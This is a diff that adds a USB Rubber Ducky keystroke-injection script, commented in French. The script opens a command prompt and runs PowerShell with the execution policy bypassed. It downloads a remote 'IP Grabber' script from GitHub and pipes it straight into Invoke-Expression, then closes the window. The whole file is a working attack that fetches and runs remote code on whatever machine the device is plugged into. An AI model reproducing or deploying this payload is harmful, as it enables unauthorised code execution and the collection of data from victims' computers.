@@ -1,0 +1,20 @@
+REM Auteur: Kali
+REM Contact: Discord - kalienclaquettes
+REM
+REM Ce script télécharge et exécute un script powershell à partir de GitHub
+
+REM Ouverture du CMD.exe
+GUI r
+DELAY 300
+STRING cmd
+ENTER
+DELAY 700
+
+REM Téléchargement et exécution du script powershell
+STRING powershell -ExecutionPolicy Bypass -Command "(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/Kali3159/Script-Rubber-Ducky/main/IP Grabber/IP Grabber.ps1') | Invoke-Expression"
+ENTER
+
+REM Fermeture du CMD.exe
+DELAY 300
+STRING exit
+ENTER
